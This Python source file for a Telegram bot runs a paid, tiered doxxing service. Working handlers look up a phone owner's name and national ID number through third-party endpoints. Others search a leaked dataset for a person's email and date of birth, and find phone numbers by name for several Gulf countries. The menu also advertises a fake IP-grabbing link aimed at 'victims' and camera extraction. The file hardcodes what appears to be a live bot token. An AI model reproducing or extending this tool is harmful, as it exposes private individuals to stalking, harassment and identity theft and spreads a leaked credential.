import secrets
import telebot
from bs4 import BeautifulSoup as bs
import re
from bs4 import BeautifulSoup 
import requests
from flask import Flask

from datetime import date
import random
from time import sleep
import sqlite3




token='6527576157:AAGKpaTR-x44xlmmadQJzCkTxewz-3DL9bA'



bot= telebot.TeleBot(token)
OWNERa=[]
Owner=[]
admin=[]
VIP=[]
user=[]
block=[]
allusers=[]
block_num=[]
add_admins=[]
many = [0]
ALL_VIP=[]
VIP_PREM=[]



just_owner=[]
just_admin=[]
just_users=[]
just_prem=[]
just_vip=[]
just_oner=[]

a=open('block.txt','r')
for i in a.read().splitlines():
    block.append(i)


a=open('VIP_PREM.txt','r')
for i in a.read().splitlines():
    Id=(i.split(',')[0])
    VIP_PREM.append(str(Id))
    ALL_VIP.append(str(Id))
    just_prem.append(str(Id))
    allusers.append(str(Id))





a=open('VIP.txt','r')
for i in a.read().splitlines():
    Id=(i.split(',')[0])
    VIP.append(str(Id))
    ALL_VIP.append(str(Id))
    allusers.append(str(Id))
    just_vip.append(str(Id))



a=open('owner.txt','r')
for i in a.read().splitlines():
    Owner.append(str(i))
    admin.append(str(i))
    allusers.append(str(i))
    ALL_VIP.append(str(i))
    VIP_PREM.append(str(i))
    just_owner.append(str(Id))


a=open('block_num1.txt','r')
for i in a.read().splitlines():
    block_num.append(str(i))

a=open('OWNERa.txt','r')
for i in a.read().splitlines():
    OWNERa.append(str(i))
    Owner.append(str(i))
    admin.append(str(i))
    allusers.append(str(i))
    ALL_VIP.append(str(i))
    VIP_PREM.append(str(i))
    just_owner.append(str(Id))


a=open('user.txt','r')
for i in a.read().splitlines():
    Id=(i.split(',')[0])
    user.append(str(Id))
    allusers.append(str(Id))
    just_users.append(str(Id))


a=open('admin.txt','r')
for i in a.read().splitlines():
    admin.append(str(i))
    allusers.append(str(i))
    ALL_VIP.append(str(i))
    VIP_PREM.append(str(i))
    just_admin.append(str(Id))


@bot.message_handler(commands=['A'])
def A(message):
    if str(message.chat.id) in  OWNERa: 
        try:
            text=message.text.split('/A ')[1]
            mane=0
            for i in allusers:
                mane=+1
                bot.send_message(i,text)
            bot.send_message(message.chat.id,f'''
• Done send this message :
{text}

To : [{mane}]
''')
        except:
            bot.reply_to(message,'''
• Send message like this :
/A message''')

@bot.message_handler(commands=['Date'])
def Date(message):
        if str(message.chat.id) in admin: 
            try:
                ID=message.text.split('/Date ')[1]
                users=open('user.txt','r').read()
                vip=open('VIP.txt','r').read()
                ID=str(ID)
                if ID in users :
                    for i in users.splitlines():
                        if ID == i :
                            bot.reply_to(message,f'''
• ID : {ID}
• Date : {i.split(',')[1]}
                                    ''')

                elif ID in vip :
                    for i in vip.splitlines():
                        if ID == i :
                            bot.reply_to(message,f'''
• ID : {ID}
• Date : {i.split(',')[1]}
                                    ''')
                else:
                            bot.reply_to(message,f'''
• I Don't found the ID in VIP&USER file
                                    ''')
            except:
                bot.reply_to(message,'''
• Send ID like this :
/Date ID''')




@bot.message_handler(commands=['zain'])
def zain(message):
    if str(message.chat.id) in allusers:
        try:
            try:
                name=message.text.split('/zain ')[1]
                if name in block_num:

                    bot.reply_to(message,f'''
• You cannot search for this number''')

                else:
                    r=requests.get('https://website.3d5x.repl.co/zain/private/?number='+name).text
                    hwia=requests.get('https://8bf54f22-0f7d-4305-ad42-f8c0164dfc13.id.repl.co/kartns.php?number='+name).json()['idno']
                    hwia=str(hwia).split('\n ')[1]
                    if 'الاسم' in r:
                        name1=r.split('الاسم : ')[1]
                        name2=name1.split(' <br>')[0]
                        bot.reply_to(message,f'''
• Number : {name} 
• Name : {name2}
• Identity : {hwia}''')
                    else:
                        bot.reply_to(message,'''
•  This Number Is Not For Zain :
•  /zain Number                 ''')
            except:
                    r=requests.get('https://website.3d5x.repl.co/zain/private/?number='+name).text
                    hwia=requests.get('https://8bf54f22-0f7d-4305-ad42-f8c0164dfc13.id.repl.co/kartns.php?number='+name).json()['idno']
                    hwia=str(hwia).split('The Line Owner ID/Iqama is: ')[1]
                    if 'الاسم' in r:
                        name1=r.split('الاسم : ')[1]
                        name2=name1.split(' <br>')[0]
                        bot.reply_to(message,f'''
• Number : {name} 
• Name : {name2}
• Identity : {hwia}''')


        except:
            bot.reply_to(message,'''
• send The Number Like This :
/zain Number                 ''')

    else:
                        bot.reply_to(message,'''
• Your ID --> '''+message.chat.id+'''
• To participate in the bot, contact:
@Eng_Hamzah_Ali                ''')
                        for i in admin :
                            bot.send_message(i,f'''
• This user try to start bot : 
• @{message.chat.username}
• {message.chat.id}
• {message.chat.first_name}

• He is not a member of the bot
                            '''
                                             )

@bot.message_handler(commands=['id'])
def iD_(message):
     bot.reply_to(message,' Your ID : '+str(message.chat.id))

@bot.message_handler(commands=['hail'])
def hali(message):
    if str(message.chat.id) in allusers:
        bot.reply_to(message,'''
• Search Of The Number /Hnum              
• Search Of The Email /Hem                          
        ''')


    else:
        bot.reply_to(message,'''
• To participate in the bot, contact:
@Eng_Hamzah_Ali
        ''')
        for i in admin :
            bot.send_message(i,f'''
• This user try to start bot : 
• @{message.chat.username}
• {message.chat.id}
• {message.chat.first_name}

• He is not a member of the bot
                            ''')



@bot.message_handler(commands=['Hnum'])
def Hnum(message):
    if str(message.chat.id) in allusers:
        try:
                bot.send_message(message.chat.id,f''' 
• searching ...''')
                name=message.text.split('/Hnum ')[1]
                if '@' not in name  :

                    a=open('hail.csv','r')
                    if name in a.read():

                        a=open('hail.csv','r')
                        for i in a.readlines():

                            i=str(i)
                            email=i.split(',')[12]
                            num=i.split(',')[14]
                            age=i.split(',')[30]

                            if num == name :
                                bot.send_message(message.chat.id,f''' 
• Number : {num}
• Email : {email}
• His Date Of Birth : {age}''')
                                break

                    else : 
                        bot.send_message(message.chat.id,'''
• Not Found This Number   ''')
                else : 
                        bot.send_message(message.chat.id,'''
• Enter Number Not Email
• For Search Of The Email /Hem                          
''')


        except:
                bot.reply_to(message,'''
• send the name like this :
• /Hnum Number                 ''')
    else:
            bot.reply_to(message,'''
• To participate in the bot, contact:
@Eng_Hamzah_Ali
            ''')
            for i in admin :
                bot.send_message(i,f'''
• This user try to start bot : 
• @{message.chat.username}
• {message.chat.id}
• {message.chat.first_name}

• He is not a member of the bot
                            ''')




@bot.message_handler(commands=['Hem'])
def Hem(message):
    if str(message.chat.id) in allusers:
        try:
                bot.send_message(message.chat.id,f''' 
• searching ...''')
                name=message.text.split('/Hem ')[1]
                a=open('hail.csv','r')
                if '@' in name  :

                    if name in a.read():

                        a=open('hail.csv','r')
                        for i in a.readlines():

                            i=str(i)
                            email=i.split(',')[12]
                            num=i.split(',')[14]
                            age=i.split(',')[30]

                            if email == name :
                                bot.send_message(message.chat.id,f''' 
• Number : {num}
• Email : {email}
• His Date Of Birth : {age}''')
                                break

                    else : 
                        bot.send_message(message.chat.id,'''
• Not Found This Email   ''')
                else : 
                    bot.send_message(message.chat.id,'''
• Enter Email Not Number
• For Search Of The Number /Hnum    ''')

        except:
                bot.reply_to(message,'''
• send the name like this :   
• /Hem Email                 ''')
    else:
            bot.reply_to(message,'''
• To participate in the bot, contact:
@Eng_Hamzah_Ali
            ''')
            for i in admin :
                    bot.send_message(i,f'''
• This user try to start bot : 
• @{message.chat.username}
• {message.chat.id}
• {message.chat.first_name}

• He is not a member of the bot
                            ''')


@bot.message_handler(commands=['start'])
def start(message):
    if str(message.chat.id) in OWNERa:
        bot.reply_to(message,f'''
• Wellcome Owner   {message.chat.first_name}

• Find number from name /search
• Find name from number /NUM
• For search In Hail Data /hail
• Extracting the name of the person who owns a Zain number /zain
• Search by email, username, IP address, name, and password /Soc
• Creating a fake link that extracts the victim's IP address and device information /fake_url
• Extracting a person's location and information through IP /info_ip
• Extract cameras from available countries /cams
• Extracting information about the Iraqi person /N_iraq

• This Tool By : @Eng_Hamzah_Ali

    ''')
        how_many_user=0
        for i in just_users:
            how_many_user=how_many_user+1
        how_many_admin=0
        for i in just_admin:
            how_many_admin=how_many_admin+1
        how_many_block=0
        for i in block:
            how_many_block=how_many_block+1
        how_many_Owner=0
        for i in just_owner:
            how_many_Owner=how_many_Owner+1
        how_many_VIP=0
        for i in just_vip:
            how_many_VIP=how_many_VIP+1
        how_many_prem=0
        for i in just_vip:
            how_many_prem=how_many_prem+1
        bot.send_message(message.chat.id,f'''
• Wellcome Owner   {message.chat.first_name}

• TO Add new Owner /addO
• TO Delete Owner /delO

• TO Add new Admin /addA
• TO Delete Admin /delA

• TO Add New User /addU
• TO Delete User /delU

• TO Add New VIP User /addVIP
• TO Delete VIP User /delVIP

• TO Add New premium User /addPREM
• TO Delete premium User /delPREM

• TO Block User /buser
• TO UnBlock User /unb

• TO Block Num /bnum
• TO unBlock Num /unbnum

• To share something to all users /A
• To Show the users joining date /Date 

• Number of bot users [ {int(how_many_user)} ]
• Number of bot VIP [ {int(how_many_VIP)} ]
• Number of bot PREM [ {int(how_many_prem)} ]
• Number of bot Owners [ {int(how_many_Owner)} ]
• Number of bot Admins [ {how_many_admin} ]
• Number of blocked IDs [ {how_many_block} ]
    ''')
    elif str(message.chat.id) in Owner:
        bot.reply_to(message,f'''
• Wellcome Owner   {message.chat.first_name}

• Find number from name /search
• Find name from number /NUM
• For search In Hail Data /hail
• Extracting the name of the person who owns a Zain number /zain
• Search by email, username, IP address, name, and password /Soc
• Creating a fake link that extracts the victim's IP address and device information /fake_url
• Extracting a person's location and information through IP /info_ip
• Extract cameras from available countries /cams

• This Tool By : @Eng_Hamzah_Ali
    ''')
        how_many_user=0
        for i in just_users:
            how_many_user=how_many_user+1

        how_many_admin=0
        for i in just_admin:
            how_many_admin=how_many_admin+1

        how_many_block=0
        for i in block:
            how_many_block=how_many_block+1

        how_many_VIP=0
        for i in just_vip:
            how_many_VIP=how_many_VIP+1
        
        how_many_prem=0
        for i in just_vip:
            how_many_prem=how_many_prem+1

        bot.send_message(message.chat.id,f'''
• Wellcome Owner   {message.chat.first_name}

• TO Add new Admin /addA
• TO Delete Admin /delA

• TO Add New User /addU
• TO Delete User /delU

• TO Add New VIP User /addVIP
• TO Delete VIP User /delVIP

• TO Add New premium User /addPREM
• TO Delete premium User /delPREM

• TO Block User /buser
• TO unBlock User /unb

• TO Block Num /bnum
• TO unBlock Num /unbnum

• To share something to all users /A
• To Show the users joining date /Date

• Number of bot users [ {int(how_many_user)} ]
• Number of bot VIp [ {int(how_many_VIP)} ]
• Number of bot Prem [ {int(how_many_prem)} ]
• Number of bot Admins [ {how_many_admin} ]
• Number of blocked IDs [ {how_many_block} ]
    ''')











    elif str(message.chat.id) in admin:
        bot.reply_to(message,f'''
• Wellcome Admin   {message.chat.first_name}

• for search the name /search
• Find name from number /NUM
• for search In Hail Data /hail
• Extracting the name of the person who owns a Zain number /zain
• Search by email, username, IP address, name, and password /Soc
• Creating a fake link that extracts the victim's IP address and device information /fake_url
• Extracting a person's location and information through IP /info_ip
• Extract cameras from available countries /cams
• Extracting information about the Iraqi person /N_iraq

• This Tool By : @Eng_Hamzah_Ali
    ''')
        how_many_user=0
        for i in just_users:
            how_many_user=how_many_user+1
        how_many_block=0
        for i in block:
            how_many_block=how_many_block+1
        how_many_VIP=0
        for i in just_vip:
            how_many_VIP=how_many_VIP+1
        bot.send_message(message.chat.id,f'''
• Wellcome Admin   {message.chat.first_name}

• TO Add New User /addU
• TO Delete User /delU

• TO Block User /buser
• TO unBlock User /unb

• TO Add New VIP User /addVIP
• TO Delete VIP User /delVIP

• TO Add New premium User /addPREM
• TO Delete premium User /delPREM

• TO Block Num /bnum
• TO unBlock Num /unbnum

• To Show the users joining date /Date

• Number of bot users [ {how_many_user} ]
• Number of bot users [ {int(how_many_VIP)} ]
• Number of blocked IDs [ {how_many_block} ]            ''')
    elif str(message.chat.id) in VIP_PREM:
        bot.reply_to(message,f'''
• Wellcome Admin   {message.chat.first_name}

• for search the name /search
• Find name from number /NUM
• for search In Hail Data /hail
• Extracting the name of the person who owns a Zain number /zain
• Search by email, username, IP address, name, and password /Soc
• Creating a fake link that extracts the victim's IP address and device information /fake_url
• Extracting a person's location and information through IP /info_ip
• Extract cameras from available countries /cams
• Extracting information about the Iraqi person /N_iraq

• This Tool By : @Eng_Hamzah_Ali
    ''')
    elif str(message.chat.id) in VIP:
        bot.reply_to(message,f'''
• Wellcome premium User   {message.chat.first_name}

• for search the name /search
• Find name from number /NUM
• for search In Hail Data /hail
• Extracting the name of the person who owns a Zain number /zain
• Search by email, username, IP address, name, and password /Soc
• Creating a fake link that extracts the victim's IP address and device information /fake_url
• Extracting a person's location and information through IP /info_ip
• Extract cameras from available countries /cams

• This Tool By : @Eng_Hamzah_Ali''')
    elif str(message.chat.id) in allusers:
        bot.reply_to(message,f'''
• Wellcome User   {message.chat.first_name}

• for search the name /search
• for search In Hail Data /hail
• Extracting the name of the person who owns a Zain number /zain
• Creating a fake link that extracts the victim's IP address and device information /fake_url
• Extracting a person's location and information through IP /info_ip
• Extract cameras from available countries /cams

• This Tool By : @Eng_Hamzah_Ali''')
    elif str(message.chat.id) in block:

        bot.reply_to(message,f'''
• To participate in the bot, contact:
@Eng_Hamzah_Ali''')
        

        for i in admin :
            bot.send_message(i,f'''
• This user try to start bot : 
• @{message.chat.username}
• {message.chat.id}
• {message.chat.first_name}

• He is not a member of the bot
                            ''')



    else:

        bot.reply_to(message,f'''
• To participate in the bot, contact:
@Eng_Hamzah_Ali''')

        for i in admin :
            bot.send_message(i,f'''
• This user try to start bot : 
• @{message.chat.username}
• {message.chat.id}
• {message.chat.first_name}

• He is not a member of the bot
                            ''')

@bot.message_handler(commands=['addU'])
def addU(message):
    if str(message.chat.id) in admin:
        try:
            Id=message.text.split('/addU ')[1]
            Id=str(Id)

            if Id in allusers :


                bot.send_message(message.chat.id,f'''
• Bad ! 
• This ID {Id} already exists  ''')
            else:
                try:
                    user.append(str(Id))
                    allusers.append(str(Id))
                    today=date.today()
                    b1=today.strftime("%d/%m/%Y")

                    a=0
                    add_admins.clear()
                    for i in open('add_admins.txt','r').read().splitlines():
                        add_admins.append(str(i))

                    IDn=str(message.chat.id)
                    for i in add_admins:
                        if IDn in i :
                            a=a+1

                    if str(message.chat.id) in admin:
                        if a >= 3:
                            bot.send_message(message.chat.id,f'''
• You Can't ''')
                        else:
                            pass
                    else:
                        a=a+1

                        open('user.txt','a').write(str(Id)+','+b1+'\n')
                        open('add_admins.txt','a').write(str(IDn)+','+str(Id)+','+'\n')
                    bot.send_message(message.chat.id,f'''
• Done ! 
• This Id {Id} Has Become The User ''')
                except:
                    bot.send_message(message.chat.id,f'''
• Bad ! 
• Please Enter Id Not User ''')

        except:
                bot.reply_to(message,'''
• Send The Id Like This :
/addU ID                  ''')
    else:
        bot.send_message(message.chat.id,f'''
• Bad ! 
• This Command Just For Admin And Owner  ''')




@bot.message_handler(commands=['addVIP'])
def addVIP(message):
    if str(message.chat.id) in admin:
        try:
            Id=message.text.split('/addVIP ')[1]
            Id=str(Id)
            if Id in allusers :
                bot.send_message(message.chat.id,f'''
• Bad ! 
• This ID {Id} already exists  ''')
            else:
                try:
                    user.append(str(Id))
                    ALL_VIP.append(str(Id))
                    allusers.append(str(Id))
                    today=date.today()
                    b1=today.strftime("%d/%m/%Y")
                    bot.send_message(message.chat.id,f'''
• You Can't ''')

                    open('VIP.txt','a').write(str(Id)+','+b1+'\n')
                    bot.send_message(message.chat.id,f'''
• Done ! 
• This Id {Id} Has Become The VIP User  ''')
                except:
                    bot.send_message(message.chat.id,f'''
• Bad ! 
• Please Enter Id Not User ''')


        except:
                bot.reply_to(message,'''
• Send The Id Like This :
/addVIP ID                  ''')
    else:
        bot.send_message(message.chat.id,f'''
• Bad ! 
• This Command Just For Admin And Owner  ''')













@bot.message_handler(commands=['delPREM'])
def delVIP_PREM(message):
    if str(message.chat.id) in admin:
            try:
                Id=message.text.split('/delPREM ')[1]
                Id=str(Id)
                try:
                    allusers.remove(Id)
                    VIP_PREM.remove(Id)
                    ALL_VIP.remove(Id)
                    VIP_PREM.clear()
                    a=open('VIP_PREM.txt','r')
                    for i in a.read().splitlines():
                        if Id == i:
                            pass
                        elif Id in i:
                            pass
                        else:
                            VIP_PREM.append(str(i))
                            ALL_VIP.append(str(i))
                            allusers.append(str(i))

                    a=open('VIP_PREM.txt','w').write('')
                    for i in VIP_PREM:
                        a=open('VIP_PREM.txt','a').write(str(i)+'\n')
                        
                    bot.send_message(message.chat.id,f'''
• Done ! 
• Delete This Id {Id} ''')
                except:
                    bot.send_message(message.chat.id,f'''
• Bad ! 
• Please Enter Id Not User ''')
            except:
                bot.reply_to(message,'''
• Send The Id Like This :
/addPREM ID                  ''')
    else:
        bot.send_message(message.chat.id,f'''
• Bad ! 
• This Command Just For Admin And Owner  ''')
        


@bot.message_handler(commands=['addPREM'])
def addVIP_PREM(message):
    if str(message.chat.id) in admin:
        try:
            Id=message.text.split('/addPREM ')[1]
            Id=str(Id)

            if Id in allusers :


                bot.send_message(message.chat.id,f'''
• Bad ! 
• This ID {Id} already exists  ''')
                
            else:
                try:
                    user.append(str(Id))
                    allusers.append(str(Id))
                    VIP_PREM.append(str(Id))
                    ALL_VIP.append(str(Id))
                    today=date.today()
                    b1=today.strftime("%d/%m/%Y")


                    open('VIP_PREM.txt','a').write(str(Id)+','+b1+'\n')
                    bot.send_message(message.chat.id,f'''
• Done ! 
• This Id {Id} Has Become The VIP User  ''')
                except:
                    bot.send_message(message.chat.id,f'''
• Bad ! 
• Please Enter Id Not User ''')


        except:
                bot.reply_to(message,'''
• Send The Id Like This :
/addPREM ID                  ''')
    else:
        bot.send_message(message.chat.id,f'''
• Bad ! 
• This Command Just For Admin And Owner  ''')


@bot.message_handler(commands=['bnum'])
def bnum(message):
    if str(message.chat.id) in Owner:

        try:
            Id=message.text.split('/bnum ')[1]
            Id=str(Id)

            if Id in block_num :

                bot.send_message(message.chat.id,f'''
• Bad ! 
• This ID {Id} already blocked  ''')
            else:
                try:

                    block_num.append(str(Id))
                    open('block_num1.txt','a').write(str(Id)+'\n')


                    bot.send_message(message.chat.id,f'''
• Done ! 
• This Id {Id} It has been blocked ''')

                except:
                    bot.send_message(message.chat.id,f'''
• Bad ! 
• Please Enter Id Not user ''')
        except:
            bot.reply_to(message,'''
• Send The Id Like This :
/bnum number                  ''')







    elif str(message.chat.id) in admin:

        try:
            Id=message.text.split('/bnum ')[1]
            Id=str(Id)

            if Id in block :


                bot.send_message(message.chat.id,f'''
• Bad ! 
• This ID {Id} already blocked  ''')
            else:
                try:

                    block_num.append(str(Id))
                    open('block_num1.txt','a').write(str(Id)+'\n')


                    bot.send_message(message.chat.id,f'''
• Done ! 
• This Id {Id} It has been blocked ''')

                except:
                    bot.send_message(message.chat.id,f'''
• Bad ! 
• Please Enter Id Not Admin ''')
        except:
            bot.reply_to(message,'''
• Send The Id Like This :
/bnum number                  ''')




    else:
        bot.send_message(message.chat.id,f'''
• Bad ! 
• This Command Just For Admin And Owner  ''')














@bot.message_handler(commands=['unbnum'])
def unbnum(message):
    if str(message.chat.id) in admin:
            try:
                Id=message.text.split('/unbnum ')[1]
                try:
                    a=open('block_num1.txt','r')
                    block_num.clear()
                    for i in a.read().splitlines():
                        if i == Id:
                            pass
                        else:
                            block_num.append(str(i))

                    a=open('block_num1.txt','w').write('')
                    for i in block_num:
                        a=open('block_num1.txt','a').write(str(i)+'\n')  

                    bot.send_message(message.chat.id,f'''
• Done ! 
• Unblock This number {Id} ''')
                except:
                    bot.send_message(message.chat.id,f'''
{block_num}
• Bad ! 
• Please Enter Id Not User ''')
            except:
                bot.reply_to(message,'''
• Send The Id Like This :
/unbnum number ''')
    else:
        bot.send_message(message.chat.id,f'''
• Bad ! 
• This Command Just For Admin And Owner  ''')







@bot.message_handler(commands=['buser'])
def buser(message):
    if str(message.chat.id) in admin:

        try:
            Id=message.text.split('/buser ')[1]
            Id=str(Id)

            if Id in block :

                bot.send_message(message.chat.id,f'''
• Bad ! 
• This ID {Id} already blocked  ''')
            else:
                try:

                    block.append(str(Id))
                    open('block.txt','a').write(str(Id)+'\n')


                    bot.send_message(message.chat.id,f'''
• Done ! 
• This Id {Id} It has been blocked ''')

                except:
                    bot.send_message(message.chat.id,f'''
• Bad ! 
• Please Enter Id Not Admin ''')
        except:
            bot.reply_to(message,'''
• Send The Id Like This :
/buser ID                  ''')

    else:
        bot.send_message(message.chat.id,f'''
• Bad ! 
• This Command Just For Admin And Owner  ''')
@bot.message_handler(commands=['addO'])
def addO(message):
    if str(message.chat.id) in OWNERa:

        try:
                Id=message.text.split('/addO ')[1]
                Id=str(Id)

                if Id in admin :
                    bot.send_message(message.chat.id,f'''
• Bad ! 
• This ID {Id} already Owner  ''')
                else:
                    pass
                try:
                    str(Id)
                    Owner.append(str(Id))
                    admin.append(str(Id))
                    VIP_PREM.append(str(Id))
                    allusers.append(str(Id))
                    ALL_VIP.append(str(Id))
                    open('owner.txt','a').write(str(Id)+'\n')

                    bot.send_message(message.chat.id,f'''
• Done ! 
• This Id {Id} Has Become The Owner ''')
                except:
                    bot.send_message(message.chat.id,f'''
• Bad ! 
• Please Enter Id Not Owner ''')
        except:
                bot.reply_to(message,'''
• Send The Id Like This :
/addO ID                  ''')

    else:
        bot.send_message(message.chat.id,f'''
• Bad ! 
• This Command Just For Owner  ''')


@bot.message_handler(commands=['addA'])
def addA(message):
    if str(message.chat.id) in Owner:

        try:
                Id=message.text.split('/addA ')[1]
                Id=str(Id)

                if Id in admin :
                    bot.send_message(message.chat.id,f'''
• Bad ! 
• This ID {Id} already admin  ''')
                else:
                    pass
                try:

                    
                    admin.append(str(Id))
                    VIP_PREM.append(str(Id))
                    allusers.append(str(Id))
                    ALL_VIP.append(str(Id))
                    open('admin.txt','a').write(str(Id)+'\n')

                    bot.send_message(message.chat.id,f'''
• Done ! 
• This Id {Id} Has Become The Admin ''')
                except:
                    bot.send_message(message.chat.id,f'''
• Bad ! 
• Please Enter Id Not Admin ''')
        except:
                bot.reply_to(message,'''
• Send The Id Like This :   
/addA ID                  ''')

    else:
        bot.send_message(message.chat.id,f'''
• Bad ! 
• This Command Just For Owner  ''')


@bot.message_handler(commands=['delO'])
def delO(message):
    if str(message.chat.id) in OWNERa:
            try:
                Id=message.text.split('/delO ')[1]
                try:
                    allusers.remove(Id)
                    Owner.remove(Id)
                    admin.remove(Id)
                    VIP_PREM.remove(Id)
                    ALL_VIP.remove(Id)
                    a=open('owner.txt','r')
                    Owner.clear()
                    for i in a.read().splitlines():
                        if i == Id:
                            pass
                        else:
                            user.append(str(i))

                    a=open('owner.txt','w').write('')
                    for i in Owner:
                        a=open('owner.txt','a').write(str(i)+'\n')
                    bot.send_message(message.chat.id,f'''
• Done ! 
• Delete This Id {Id} ''')
                except:
                    bot.send_message(message.chat.id,f'''
• Bad ! 
• Please Enter Id Not User ''')
            except:
                bot.reply_to(message,'''
• Send The Id Like This :
/delO ID ''')
    else:
        bot.send_message(message.chat.id,f'''
• Bad ! 
• This Command Just For Owner  ''')









@bot.message_handler(commands=['delVIP'])
def delVIP(message):
    if str(message.chat.id) in admin:
            try:
                Id=message.text.split('/delVIP ')[1]
                try:
                    allusers.remove(Id)
                    ALL_VIP.remove(Id)
                    a=open('VIP.txt','r')
                    VIP.clear()
                    for i in a.read().splitlines():
                        Id=str(Id)

                        if Id == i:
                            pass
                        elif Id in i:
                            pass
                        else:
                            VIP.append(str(i))
                            allusers.append(str(i))

                    a=open('VIP.txt','w').write('')
                    for i in VIP:
                        a=open('VIP.txt','a').write(str(i)+'\n')
                    bot.send_message(message.chat.id,f'''
• Done ! 
• Delete This Id {Id} ''')
                except:
                    bot.send_message(message.chat.id,f'''
• Bad ! 
• Please Enter Id Not User ''')
            except:
                bot.reply_to(message,'''
• Send The Id Like This :
/delVIP ID ''')
    else:
        bot.send_message(message.chat.id,f'''
• Bad ! 
• This Command Just For Admin And Owner  ''')





@bot.message_handler(commands=['delU'])
def delU(message):
    if str(message.chat.id) in admin:
            try:
                Id=message.text.split('/delU ')[1]
                try:
                    allusers.remove(Id)
                    user.remove(Id)
                    a=open('user.txt','r')
                    user.clear()
                    for i in a.read().splitlines():
                        Id=str(Id)

                        if Id == i:
                            pass
                        else:
                            user.append(str(i))
                            allusers.append(str(i))

                    a=open('user.txt','w').write('')
                    for i in user:
                        a=open('user.txt','a').write(str(i)+'\n')
                    bot.send_message(message.chat.id,f'''
• Done ! 
• Delete This Id {Id} ''')
                except:
                    bot.send_message(message.chat.id,f'''
• Bad ! 
• Please Enter Id Not User ''')
            except:
                bot.reply_to(message,'''
• Send The Id Like This :
/delU ID ''')
    else:
        bot.send_message(message.chat.id,f'''
• Bad ! 
• This Command Just For Admin And Owner  ''')
        
        
@bot.message_handler(commands=['unb'])
def unb(message):
    if str(message.chat.id) in admin:
            try:
                Id=message.text.split('/unb ')[1]
                try:
                    block.remove(Id)

                    a=open('block.txt','r')
                    block.clear()
                    for i in a.read().splitlines():
                        if i == Id:
                            pass
                        else:
                            block.append(str(i))

                    a=open('block.txt','w').write('')
                    for i in block:
                        a=open('block.txt','a').write(str(i)+'\n')

                    bot.send_message(message.chat.id,f'''
• Done ! 
• Unblock This Id {Id} ''')
                except:
                    bot.send_message(message.chat.id,f'''
• Bad ! 
• Please Enter Id Not User ''')
            except:
                bot.reply_to(message,'''
• Send The Id Like This :
/unb ID ''')
    else:
        bot.send_message(message.chat.id,f'''
• Bad ! 
• This Command Just For Admin And Owner  ''')
        

@bot.message_handler(commands=['delA'])
def delA(message):
    if str(message.chat.id) in Owner:
                Id=message.text.split('/delA ')[1]
                try:
                    admin.remove(Id)
                except:
                     pass
                try:
                     ALL_VIP.remove(Id)
                except:
                     pass
                try:
                    VIP_PREM.remove(Id)
                except:
                     pass
                try:
                     allusers.remove(Id)
                except:
                     pass
                a=open('admin.txt','r')
                admin.clear()
                for i in a.read().splitlines():
                    if i == Id:
                        pass
                    else:
                        admin.append(str(i))

                a=open('admin.txt','w').write('')
                for i in admin:
                    a=open('admin.txt','a').write(str(i)+'\n')

                bot.send_message(message.chat.id,f'''
• Done ! 
• Delete This Id {Id} ''')



    else:
        bot.send_message(message.chat.id,f'''
• Bad ! 
• This Command Just For Admin And Owner  ''')
@bot.message_handler(commands=['search'])
def code(message):
    if str(message.chat.id) in  allusers :
        bot.reply_to(message,'''
/966 >> Saudi arabia
/965 >> kuwait 
/974 >> Qatar 
/964 >> Iraq 
/20 >> Egypt 
/963 >> Syria 
/973 >> Bahrain
                ''')
    else:
        bot.reply_to(message,'''
• To participate in the bot, contact:
@Eng_Hamzah_Ali
        ''')
        for i in admin :
                    bot.send_message(i,f'''
• This user try to start bot : 
• @{message.chat.username}
• {message.chat.id}
• {message.chat.first_name}

• He is not a member of the bot
                            ''')

@bot.message_handler(commands=['966'])
def code(message):
    if str(message.chat.id) in allusers :
        try:
            name=message.text.split('/966 ')[1]
        except:
            bot.reply_to(message,'''
• send the name like this :
/966 name                 ''')
        try:
            name=message.text.split('/966 ')[1]
            bot.reply_to(message,'''
• Searching ...''')
            url = 'https://caller-id.saedhamdan.com/index.php/UserManagement/search_number?country_code=SA&name='+name
            try:

                test=requests.post(url).json()['result']

                for i in test :
                        SEND=f'''
• Name : {name}
• Number : {i['number']}
• Country Code : {i['country_code']}
= = = = = = = = = = = = = = = = =
• By : @Eng_Hamzah_Ali
                        '''
                        bot.send_message(message.chat.id,SEND)
            except:
                SEND=f'''
• No results found, there may be a problem 
                        '''
        except:
            pass
    else:
        bot.send_message(message.chat.id,f'''
• Your ID --> '''+message.chat.id+'''
• To participate in the bot, contact:
@Eng_Hamzah_Ali''')
        for i in admin :
                    bot.send_message(i,f'''
• This user try to start bot : 
• @{message.chat.username}
• {message.chat.id}
• {message.chat.first_name}

• He is not a member of the bot
                            ''')




@bot.message_handler(commands=['965'])
def code(message):
    if str(message.chat.id) in allusers :
        try:
            name=message.text.split('/965 ')[1]
        except:
            bot.reply_to(message,'''
• send the name like this :
/966 name                 ''')
        try:
            name=message.text.split('/965 ')[1]
            bot.reply_to(message,'''
• Searching ...''')
            url = 'https://caller-id.saedhamdan.com/index.php/UserManagement/search_number?country_code=KW&name='+name
            try:

                test=requests.post(url).json()['result']

                for i in test :
                        SEND=f'''
• Name : {name}
• Number : {i['number']}
• Country Code : {i['country_code']}
= = = = = = = = = = = = = = = = =
• By : @Eng_Hamzah_Ali
                        '''
                        bot.send_message(message.chat.id,SEND)
            except:
                SEND=f'''
• No results found, there may be a problem 
                        '''
        except:
            pass
    else:
        bot.send_message(message.chat.id,f'''
• Your ID --> '''+message.chat.id+'''
• To participate in the bot, contact:
@Eng_Hamzah_Ali''')
        for i in admin :
                    bot.send_message(i,f'''
• This user try to start bot : 
• @{message.chat.username}
• {message.chat.id}
• {message.chat.first_name}

• He is not a member of the bot
                            ''')


@bot.message_handler(commands=['974'])
def code(message):
    if str(message.chat.id) in allusers :
        try:
            name=message.text.split('/974 ')[1]
        except:
            bot.reply_to(message,'''
• send the name like this :
/966 name                 ''')
        try:
            name=message.text.split('/974 ')[1]
            bot.reply_to(message,'''
• Searching ...''')
            url = 'https://caller-id.saedhamdan.com/index.php/UserManagement/search_number?country_code=QA&name='+name
            try:

                test=requests.post(url).json()['result']

                for i in test :
                        SEND=f'''
• Name : {name}
• Number : {i['number']}
• Country Code : {i['country_code']}
= = = = = = = = = = = = = = = = =
• By : @Eng_Hamzah_Ali
                        '''
                        bot.send_message(message.chat.id,SEND)
            except:
                SEND=f'''
• No results found, there may be a problem 
                        '''
        except:
            pass
    else:
        bot.send_message(message.chat.id,f'''
• Your ID --> '''+message.chat.id+'''
• To participate in the bot, contact:
@Eng_Hamzah_Ali''')
        for i in admin :
                    bot.send_message(i,f'''
• This user try to start bot : 
• @{message.chat.username}
• {message.chat.id}
• {message.chat.first_name}

